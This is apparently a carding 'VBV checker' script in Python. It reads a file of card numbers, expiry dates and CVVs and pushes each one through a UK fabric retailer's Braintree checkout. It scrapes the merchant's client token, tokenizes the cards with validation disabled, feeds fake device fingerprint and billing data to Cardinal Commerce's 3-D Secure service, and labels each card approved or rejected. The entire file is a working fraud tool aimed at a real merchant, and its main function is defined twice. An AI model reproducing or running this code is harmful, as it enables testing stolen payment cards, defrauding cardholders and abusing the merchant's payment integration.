import requests,re,random,bs4,base64,uuid,string

def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def generar_uuid():
    return str(uuid.uuid4())


def plug_rnd():
    random_chars = "".join(random.choices(string.ascii_letters + string.digits, k=10))
    random_suffix = "".join(random.choices(string.ascii_letters + string.digits, k=28))
    random_yux = "".join(random.choices(string.ascii_letters + string.digits, k=3))
    return f"{random_chars}::{random_suffix}::{random_yux}"
def b3_vbv(ey, url, price, cc, month, year, cvv):
    with requests.Session() as session:
        sessionId = generar_uuid()
        sessionId2 = generar_uuid()
        Fingerprint = "".join(random.choice("0123456789abcdef") for _ in range(32))
        plug = plug_rnd()
        plug2 = plug_rnd()

        be_1 = base64.b64decode(ey).decode("utf-8")
        be = capture(be_1, '"authorizationFingerprint":"', '"')
        me = capture(
            be_1,
            "https://api.braintreegateway.com:443/merchants/",
            "/client_api/v1/configuration",
        )

        h = {
            "Host": "payments.braintree-api.com",
            "content-type": "application/json",
            "authorization": f"Bearer {be}",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "braintree-version": "2018-05-10",
            "accept": "*/*",
            "origin": f"https://{url}",
        }

        p = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": f"{sessionId}",
            },
            "query": "query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }",
            "operationName": "ClientConfiguration",
        }

        r = session.post(
            "https://payments.braintree-api.com/graphql",
            headers=h,
            json=p,
        )
        t = r.text
        jt = capture(t, '"cardinalAuthenticationJWT":"', '"')

        h2 = {
            "Host": "payments.braintree-api.com",
            "content-type": "application/json",
            "authorization": f"Bearer {be}",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "braintree-version": "2018-05-10",
            "accept": "*/*",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/",
        }

        p2 = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "dropin2",
                "sessionId": f"{sessionId}",
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": f"{cc}",
                        "expirationMonth": f"{month}",
                        "expirationYear": f"{year}",
                        "cvv": f"{cvv}",
                        "cardholderName": "Sachio YT",
                        "billingAddress": {"postalCode": "10027"},
                    },
                    "options": {"validate": False},
                }
            },
            "operationName": "TokenizeCreditCard",
        }

        r2 = session.post(
            "https://payments.braintree-api.com/graphql",
            headers=h2,
            json=p2,
        )
        t2 = r2.text
        tok = capture(t2, '"token":"', '"')
        bin_ = capture(t2, '"bin":"', '"')

        h3 = {
            "Host": "centinelapi.cardinalcommerce.com",
            "content-type": "application/json;charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "*/*",
            "origin": f"https://{url}",
        }

        p3 = {
            "BrowserPayload": {
                "Order": {
                    "OrderDetails": {},
                    "Consumer": {
                        "BillingAddress": {},
                        "ShippingAddress": {},
                        "Account": {},
                    },
                    "Cart": [],
                    "Token": {},
                    "Authorization": {},
                    "Options": {},
                    "CCAExtension": {},
                },
                "SupportsAlternativePayments": {
                    "cca": True,
                    "hostedFields": False,
                    "applepay": False,
                    "discoverwallet": False,
                    "wallet": False,
                    "paypal": False,
                    "visacheckout": False,
                },
            },
            "Client": {"Agent": "SongbirdJS", "Version": "1.35.0"},
            "ConsumerSessionId": None,
            "ServerJWT": f"{jt}",
        }

        r3 = session.post(
            "https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init",
            headers=h3,
            json=p3,
        )
        t3 = r3.text
        re_ = capture(t3, '"CardinalJWT":"', '"')
        encabezado_base64, carga_util_base64, firma = re_.split(".")
        re_1 = base64.urlsafe_b64decode(
            carga_util_base64 + "=" * (4 - len(carga_util_base64) % 4)
        ).decode("utf-8")
        re = capture(re_1, '"referenceId":"', '",')
        ge = capture(re_1, '"geolocation":"', '"')
        org = capture(re_1, '"orgUnitId":"', '"')

        r4 = session.get(
            f"https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=True&alias=Default&orgUnitId={org}&tmEventType=PAYMENT&referenceId={re}&geolocation={ge}&origin=Songbird",
        )
        t4 = r4.text
        no = capture(t4, '"nonce":"', '"')

        h5 = {
            "Host": "geo.cardinalcommerce.com",
            "content-type": "application/json",
            "accept": "*/*",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "origin": "https://geo.cardinalcommerce.com",
            "referer": f"https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=True&alias=Default&orgUnitId={org}&tmEventType=PAYMENT&referenceId={re}&geolocation={ge}&origin=Songbird",
        }

        p5 = {
            "Cookies": {"Legacy": True, "LocalStorage": True, "SessionStorage": True},
            "DeviceChannel": "Browser",
            "Extended": {
                "Browser": {
                    "Adblock": True,
                    "AvailableJsFonts": [],
                    "DoNotTrack": "unknown",
                    "JavaEnabled": False,
                },
                "Device": {
                    "ColorDepth": 24,
                    "Cpu": "unknown",
                    "Platform": "Linux armv81",
                    "TouchSupport": {
                        "MaxTouchPoints": 5,
                        "OnTouchStartAvailable": True,
                        "TouchEventCreationSuccessful": True,
                    },
                },
            },
            "Fingerprint": f"{Fingerprint}",
            "FingerprintingTime": 1243,
            "FingerprintDetails": {"Version": "1.5.1"},
            "Language": "es-419",
            "Latitude": None,
            "Longitude": None,
            "OrgUnitId": f"{org}",
            "Origin": "Songbird",
            "Plugins": [f"{plug}", f"{plug2}"],
            "ReferenceId": f"{re}",
            "Referrer": "",
            "Screen": {
                "FakedResolution": False,
                "Ratio": 2.2222222222222223,
                "Resolution": "800x360",
                "UsableResolution": "800x360",
                "CCAScreenSize": "01",
            },
            "CallSignEnabled": None,
            "ThreatMetrixEnabled": False,
            "ThreatMetrixEventType": "PAYMENT",
            "ThreatMetrixAlias": "Default",
            "TimeOffset": 300,
            "UserAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "UserAgentDetails": {"FakedOS": False, "FakedBrowser": False},
            "BinSessionId": f"{no}",
        }

        r5 = session.post(
            "https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData",
            headers=h5,
            json=p5,
        )

        h6 = {
            "Host": "api.braintreegateway.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "*/*",
            "origin": f"https://{url}",
        }

        p6 = {
            "amount": f"{price}",
            "additionalInfo": {
                "acsWindowSize": "03",
                "billingLine1": "118 W 132nd St",
                "billingPostalCode": "KA7 0PR",
                "billingCountryCode": "US",
                "billingPhoneNumber": "19006318646",
                "billingGivenName": "Sachio",
                "billingSurname": "YT",
                "email": "sachiopremiun@gmail.com",
            },
            "bin": f"{bin_}",
            "dfReferenceId": f"{re}",
            "clientMetadata": {
                "requestedThreeDSecureVersion": "2",
                "sdkVersion": "web/3.80.0",
                "cardinalDeviceDataCollectionTimeElapsed": 1354,
                "issuerDeviceDataCollectionTimeElapsed": 4237,
                "issuerDeviceDataCollectionResult": True,
            },
            "authorizationFingerprint": f"{be}",
            "braintreeLibraryVersion": "braintree/web/3.80.0",
            "_meta": {
                "merchantAppId": f"{url}",
                "platform": "web",
                "sdkVersion": "3.80.0",
                "source": "client",
                "integration": "custom",
                "integrationType": "custom",
                "sessionId": f"{sessionId2}",
            },
        }

        r6 = session.post(
            f"https://api.braintreegateway.com/merchants/{me}/client_api/v1/payment_methods/{tok}/three_d_secure/lookup",
            headers=h6,
            json=p6,
        )
        t6 = r6.text
        nonce = capture(t6, '"nonce":"', '"')
        status = capture(t6, '"status":"', '"')
        enrolled = capture(t6, '"enrolled":"', '"')

        return f"{status} - [{enrolled}]", nonce


def vbv(cc, month, year, cvv):
    with requests.Session() as s:

        r = s.get(
            "https://www.justfabrics.co.uk/curtain-accessories/tape-and-buckram/3-pencil-pleat-tape/"
        )

        p2 = "qty=1&id=42&type=curtain-accessories&action=add-to-basket"

        r2 = s.post(
            "https://www.justfabrics.co.uk/includes/add-to-basket.php", data=p2
        )

        r3 = s.get("https://www.justfabrics.co.uk/designer-fabrics/cart.php")
        t3 = r3.text
        client = capture(t3, "braintree.client.create({", ")").strip()
        ey = capture(client, "authorization: '", "'")
        vbv, nonce = b3_vbv(
            ey, "www.justfabrics.co.uk", "2.27", cc, month, year, cvv
        )

        if "authenticate_successful" in vbv or "authenticate_attempt_successful" in vbv:
            status = "Approved! ✅"
        else:
            status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"

        return status, vbv


def vbv(cc, month, year, cvv):
    with requests.Session() as s:

        r = s.get(
            "https://www.justfabrics.co.uk/curtain-accessories/tape-and-buckram/3-pencil-pleat-tape/"
        )

        p2 = "qty=1&id=42&type=curtain-accessories&action=add-to-basket"

        r2 = s.post(
            "https://www.justfabrics.co.uk/includes/add-to-basket.php", data=p2
        )

        r3 = s.get("https://www.justfabrics.co.uk/designer-fabrics/cart.php")
        t3 = r3.text
        client = capture(t3, "braintree.client.create({", ")").strip()
        ey = capture(client, "authorization: '", "'")
        vbv, nonce = b3_vbv(
            ey, "www.justfabrics.co.uk", "2.27", cc, month, year, cvv
        )

        if "authenticate_successful" in vbv or "authenticate_attempt_successful" in vbv:
            status = "Approved! ✅"
        else:
            status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"

        return status, vbv

file=input('enter list path: ')
g=open(file,'r')
for g in g:
	c = g.strip().split('\n')[0]
	cc = c.split('|')[0]
	exp=c.split('|')[1]
	ex=c.split('|')[2]
	try:
		exy=ex[2]+ex[3]
		if '2' in ex[3] or '1' in ex[3]:
			exy=ex[2]+'7'
		else:pass
	except:
		exy=ex[0]+ex[1]
		if '2' in ex[1] or '1' in ex[1]:
			exy=ex[0]+'7'
		else:pass
	cvc=c.split('|')[3]
	exy='20'+exy
	re=vbv(cc, exp, exy, cvc)
	print(c,re)

	